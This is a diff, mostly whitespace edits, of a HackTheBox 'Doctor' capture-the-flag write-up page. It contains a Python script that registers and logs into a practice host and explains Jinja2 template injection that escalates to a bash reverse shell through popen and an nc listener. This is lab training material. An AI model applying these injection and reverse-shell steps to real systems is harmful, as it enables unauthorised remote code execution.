@@ -51,71 +51,72 @@ body {
 	The following code will randomly generate a string, register a new account with that string, and login.			<br/><br/>
 
 	<pre>
-	#!/usr/bin/python3									<br/>
-												<br/>
-	from pwn import *									<br/>
-	import requests, time, random, string							<br/>
-												<br/>
-	my_ip = "10.10.14.29"									<br/>
-	my_port = "8000"									<br/>
-												<br/>
-	reg_url      = 'http://doctors.htb/register'						<br/>
-	login_url    = 'http://doctors.htb/login'						<br/>
-	home_url     = 'http://doctors.htb/home'						<br/>
-	inject_url   = 'http://doctors.htb/post/new'						<br/>
-	archive_url  = 'http://doctors.htb/archive'						<br/>
-												<br/>
-	def get_random_string(length):								<br/>
-    		letters = string.ascii_lowercase							<br/>
-    		result_str = ''.join(random.choice(letters) for i in range(length))			<br/>
-    		return result_str									<br/>
-													<br/>
-	user = get_random_string(6).capitalize()						<br/>
-	email = user + "@yahoo.com"								<br/>
-												<br/>
-	# the data for our 3 post requests, fields copied from burpsuite after manual tests	<br/>
-	reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}	<br/>
-	login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}			<br/>
-	inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }		<br/>
-													<br/>
-	with requests.Session() as session:								<br/>
-    		# Attempt to hit the register endpoint and create an account				<br/>
-    		get = session.get(reg_url)								<br/>
-    		post = session.post(reg_url, data=reg_dict)						<br/>
-    		if "Your account has been created, with a time limit of twenty minutes!" not in post.text:	<br/>
-        		print("[-] Account creation failed.. exiting")					<br/>
-        		exit(0)										<br/>
-    		print("[+] Created account " + email)							<br/>
-													<br/>
-    		# Attempt to login with our new creds							<br/>
-    		login = session.post(login_url, data=login_dict)					<br/>
-    		if "Logout" not in login.text:								<br/>
-        		print("[-] Login failed.. exiting")						<br/>
-        		exit(0)										<br/>
-    		print("[+] Login success")								<br/>
-	</pre>												<br/><br/>					
+	#!/usr/bin/python3									
+												
+	from pwn import *									
+	import requests, time, random, string							
+												
+	my_ip = "10.10.14.29"									
+	my_port = "8000"									
+												
+	reg_url      = 'http://doctors.htb/register'						
+	login_url    = 'http://doctors.htb/login'						
+	home_url     = 'http://doctors.htb/home'						
+	inject_url   = 'http://doctors.htb/post/new'						
+	archive_url  = 'http://doctors.htb/archive'						
+												
+	def get_random_string(length):								
+    		letters = string.ascii_lowercase							
+    		result_str = ''.join(random.choice(letters) for i in range(length))			
+    		return result_str									
+													
+	user = get_random_string(6).capitalize()						
+	email = user + "@yahoo.com"								
+												
+	# the data for our 3 post requests, fields copied from burpsuite after manual tests	
+	reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}	
+	login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}			
+	inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }		
+													
+	with requests.Session() as session:	
+	
+    		# Attempt to hit the register endpoint and create an account				
+    		get = session.get(reg_url)								
+    		post = session.post(reg_url, data=reg_dict)						
+    		if "Your account has been created, with a time limit of twenty minutes!" not in post.text:	
+        		print("[-] Account creation failed.. exiting")					
+        		exit(0)										
+    		print("[+] Created account " + email)							
+													
+    		# Attempt to login with our new creds							
+    		login = session.post(login_url, data=login_dict)					
+    		if "Logout" not in login.text:								
+        		print("[-] Login failed.. exiting")						
+        		exit(0)										
+    		print("[+] Login success")								
+	</pre>																
 
 	The next challenge is to figure out our injection. I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"> resource here </a> <br/><br/>
 
 	Initially I tried the basic jinja2 injection, trying to see if we can get the server to execute {4*4*4} on the archives page, 					<br/>
 	if successfull we should see the number 64 presented to us. 													<br/><br/>
 
-	We can see on the archives page source that our code is inside 					<br/>																													<br/>
-	of both a title and item bracket, so our injection will start out closing those first.		<br/> <br/>
+	We can see on the archives page source that our code is inside 							<br/>																													<br/>
+	of both a title and item bracket, so our injection will start out closing those first.				<br/> <br/>
 
 	<b><code>
 		&lt;item&gt;&lt;title&gt; OUR-POST-GETS-INJECTED-HERE 	&lt;/item&gt;&lt;/title&gt;
-	</code></b>											<br/> <br/>
+	</code></b>													<br/> <br/>
 
-	After injecting 										<br/>
+	After injecting 												<br/>
 	<code>
 		&lt;/title&gt; &lt;/item&gt; {4*4*4}
-	</code>												<br/> <br/>
+	</code>														<br/> <br/>
 
-	The source code should look like								<br/>
+	The source code should look like										<br/>
 	<code>
 		&lt;item>&lt;title&gt; &lt;/item>&lt;/title&gt; {4*4*4}&lt;/item&gt;&lt;/title&gt;
-	</code>												<br/> <br/>
+	</code>														<br/> <br/>
 
 	We can see the expected output, 64, on the archives page							<br/><br/>
 	<img src="images/doctor/inject2.PNG" alt="basic injection" class="inline"/>         				<br/> <br/> <br/>
@@ -127,11 +128,11 @@ body {
 	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         				<br/> <br/> <br/>
 
 
-	I successfully attempted it with the /usr/bin/whoami command and got a response back. My				<br/>
-	next step was to see if we can run bash. It turned out successful and we got the shell back				<br/> <br/>
-	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         					<br/> <br/> <br/>
+	I successfully attempted it with the /usr/bin/whoami command and got a response back. My			<br/>
+	next step was to see if we can run bash. It turned out successful and we got the shell back			<br/> <br/>
+	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline"/>         				<br/> <br/> <br/>
 
-	From here I threw in our successful injection into the python script and we arrive at the final code <br/> <br/>
+	From here I threw in our successful injection into the python script and we arrive at the final code		<br/> <br/>
 
 
 	<pre>
@@ -210,14 +211,14 @@ body {
         		l.interactive()
 	</pre>
 
-			Our final code will register a new account under a random string, login,			<br/>
-			create a post with our bash injection, startup a nc listener, and then finally 			<br/>
-			query the /archives page to trigger the connection. The end result is a user 			<br/>
-			shell as web on doctor.										<br/><br/>
-			<img src="images/doctor/low-priv-script.PNG" alt="user script" class="inline"/>   		<br/> <br/> <br/>
+	Our final code will register a new account under a random string, login,			<br/>
+	create a post with our bash injection, startup a nc listener, and then finally 			<br/>
+	query the /archives page to trigger the connection. The end result is a user 			<br/>
+	shell as web on doctor.										<br/><br/>
+	<img src="images/doctor/low-priv-script.PNG" alt="user script" class="inline"/>   		<br/> <br/> <br/>
 
 
-          </p>
+        </p>
 </div><!-- /.blurb -->
 <div class="blurb">
 </div><!-- /.container -->
